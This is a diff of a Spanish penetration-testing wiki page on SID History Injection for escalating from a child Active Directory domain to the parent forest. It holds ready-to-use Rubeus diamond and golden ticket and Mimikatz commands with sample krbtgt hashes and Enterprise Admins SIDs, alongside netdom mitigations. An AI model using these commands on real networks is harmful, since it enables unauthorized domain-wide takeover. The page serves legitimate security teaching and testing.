@@ -4,17 +4,45 @@
 
 ## Ataque de Inyección de SID History
 
-El enfoque del **Ataque de Inyección de SID History** es ayudar en la **migración de usuarios entre dominios** mientras se asegura el acceso continuo a los recursos del dominio anterior. Esto se logra **incorporando el Identificador de Seguridad (SID) anterior del usuario en el SID History** de su nueva cuenta. Notablemente, este proceso puede ser manipulado para otorgar acceso no autorizado al agregar el SID de un grupo de alto privilegio (como Enterprise Admins o Domain Admins) del dominio padre al SID History. Esta explotación confiere acceso a todos los recursos dentro del dominio padre.
+El enfoque del **Ataque de Inyección de SID History** es ayudar en la **migración de usuarios entre dominios** mientras se asegura el acceso continuo a los recursos del dominio anterior. Esto se logra **incorporando el Identificador de Seguridad (SID) anterior del usuario en el SID History** de su nueva cuenta. Notablemente, este proceso puede ser manipulado para otorgar acceso no autorizado al agregar el SID de un grupo de alto privilegio (como Administradores de Empresa o Administradores de Dominio) del dominio padre al SID History. Esta explotación confiere acceso a todos los recursos dentro del dominio padre.
 
 Existen dos métodos para ejecutar este ataque: a través de la creación de un **Golden Ticket** o un **Diamond Ticket**.
 
-Para identificar el SID del grupo **"Enterprise Admins"**, primero se debe localizar el SID del dominio raíz. Tras la identificación, el SID del grupo Enterprise Admins se puede construir agregando `-519` al SID del dominio raíz. Por ejemplo, si el SID del dominio raíz es `S-1-5-21-280534878-1496970234-700767426`, el SID resultante para el grupo "Enterprise Admins" sería `S-1-5-21-280534878-1496970234-700767426-519`.
+Para identificar el SID del grupo **"Administradores de Empresa"**, primero se debe localizar el SID del dominio raíz. Tras la identificación, el SID del grupo de Administradores de Empresa se puede construir agregando `-519` al SID del dominio raíz. Por ejemplo, si el SID del dominio raíz es `S-1-5-21-280534878-1496970234-700767426`, el SID resultante para el grupo "Administradores de Empresa" sería `S-1-5-21-280534878-1496970234-700767426-519`.
 
-También se podría usar el SID de los grupos **Domain Admins**, que termina en **512**.
+También podrías usar los grupos de **Administradores de Dominio**, que terminan en **512**.
 
-Otra forma de encontrar el SID de un grupo del otro dominio (por ejemplo "Domain Admins") es con:
-```powershell
+Otra forma de encontrar el SID de un grupo del otro dominio (por ejemplo "Administradores de Dominio") es con:
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Tenga en cuenta que es posible deshabilitar el historial de SID en una relación de confianza, lo que hará que este ataque falle.
+
+Según los [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Deshabilitar SIDHistory en relaciones de confianza de bosque** utilizando la herramienta netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Aplicar cuarentena de filtro SID a relaciones de confianza externas** utilizando la herramienta netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Aplicar filtrado de SID a relaciones de confianza de dominio dentro de un solo bosque** no se recomienda, ya que es una configuración no soportada y puede causar cambios disruptivos. Si un dominio dentro de un bosque no es de confianza, entonces no debería ser miembro del bosque. En esta situación, es necesario primero dividir los dominios de confianza y no confiables en bosques separados donde se pueda aplicar el filtrado de SID a una relación de confianza interbosque.
+
+Consulte esta publicación para obtener más información sobre cómo eludir esto: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+La última vez que intenté esto, necesitaba agregar el argumento **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Golden Ticket (Mimikatz) con KRBTGT-AES256
 ```bash
@@ -39,16 +67,7 @@ Para más información sobre los tickets dorados, consulta:
 golden-ticket.md
 {{#endref}}
 
-### Ticket Diamante (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 Para más información sobre los tickets de diamante, consulta:
 
 {{#ref}}
@@ -59,7 +78,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Escalar a DA de root o administrador de Enterprise utilizando el hash KRBTGT del dominio comprometido:
+Escalar a DA de root o administrador de la empresa utilizando el hash KRBTGT del dominio comprometido:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -108,8 +127,8 @@ Este es un script de Impacket que **automatiza la escalada de un dominio hijo a 
 
 El flujo es:
 
-- Obtiene el SID del grupo de Administradores de la Empresa del dominio padre
-- Recupera el hash de la cuenta KRBTGT en el dominio hijo
+- Obtiene el SID para el grupo de Administradores de la Empresa del dominio padre
+- Recupera el hash para la cuenta KRBTGT en el dominio hijo
 - Crea un Golden Ticket
 - Inicia sesión en el dominio padre
 - Recupera credenciales para la cuenta de Administrador en el dominio padre
